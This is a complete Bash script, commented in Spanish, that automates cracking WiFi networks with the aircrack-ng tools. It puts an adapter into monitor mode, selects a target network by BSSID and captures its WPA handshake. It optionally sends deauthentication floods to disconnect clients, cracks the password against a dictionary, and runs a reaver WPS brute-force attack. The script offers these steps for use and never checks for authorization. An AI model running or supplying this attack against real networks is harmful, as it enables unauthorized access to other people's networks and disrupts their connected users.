#!/bin/bash

# Comprobación de permisos
if [[ $EUID -ne 0 ]]; then
    echo "Este script debe ejecutarse como root. Usa 'sudo'."
    exit 1
fi

# Variables iniciales
capture_file="captura"
diccionario=""
adaptador=""

# Paso 1: Selección del adaptador WiFi
echo "Detectando adaptadores WiFi disponibles..."
ip a | grep -i "wl" | awk '{print $2}' | sed 's/://g'
echo "Introduce el nombre de tu adaptador WiFi (ej. wlan0):"
read adaptador

# Paso 2: Activar modo monitor
sudo airmon-ng check kill
sudo airmon-ng start $adaptador
monitor_interface="${adaptador}mon"
echo "Modo monitor activado en $monitor_interface."

# Paso 3: Escaneo de redes
echo "Escaneando redes disponibles..."
echo "Presiona Ctrl+C cuando identifiques la red de interés."
sudo airodump-ng $monitor_interface

# Selección de red objetivo
echo "Introduce el BSSID de la red objetivo:"
read bssid
echo "Introduce el canal de la red objetivo:"
read canal

# Paso 4: Monitorear la red seleccionada
sudo airodump-ng --bssid $bssid --channel $canal --write $capture_file $monitor_interface &
monitor_pid=$!
echo "Monitoreando la red. Capturando handshakes..."

# Opción de desconectar clientes para capturar el handshake
echo "¿Quieres enviar paquetes de deauth para forzar un handshake? (s/n)"
read deauth_choice
if [[ $deauth_choice == "s" ]]; then
    echo "Introduce la MAC de un cliente conectado o deja vacío para enviar deauth broadcast:"
    read cliente_mac
    if [[ -z $cliente_mac ]]; then
        sudo aireplay-ng --deauth 10 -a $bssid $monitor_interface
    else
        sudo aireplay-ng --deauth 10 -a $bssid -c $cliente_mac $monitor_interface
    fi
fi

# Esperar a que el usuario decida detener el monitoreo
echo "Presiona Enter para detener el monitoreo y analizar el handshake."
read
kill $monitor_pid

# Verificar la captura
if [[ -f "${capture_file}-01.cap" ]]; then
    echo "Handshake capturado exitosamente."
else
    echo "No se pudo capturar el handshake. Intenta de nuevo."
    exit 1
fi

# Paso 5: Análisis del handshake
echo "Introduce la ruta del diccionario para intentar descifrar la contraseña:"
read diccionario
if [[ ! -f $diccionario ]]; then
    echo "Diccionario no encontrado. Verifica la ruta e inténtalo de nuevo."
    exit 1
fi

sudo aircrack-ng -w $diccionario -b $bssid ${capture_file}-01.cap

# Paso 6: Evaluación de WPS (opcional)
echo "¿Quieres probar la vulnerabilidad WPS en la red? (s/n)"
read wps_choice
if [[ $wps_choice == "s" ]]; then
    sudo wash -i $monitor_interface
    echo "Introduce el BSSID de la red para intentar el ataque WPS:"
    read wps_bssid
    sudo reaver -i $monitor_interface -b $wps_bssid -vv
fi

# Limpieza y restauración
sudo airmon-ng stop $monitor_interface
sudo service NetworkManager restart
echo "Modo monitor desactivado y NetworkManager restaurado."

# Finalización
echo "Pruebas completadas. Revisa los resultados."
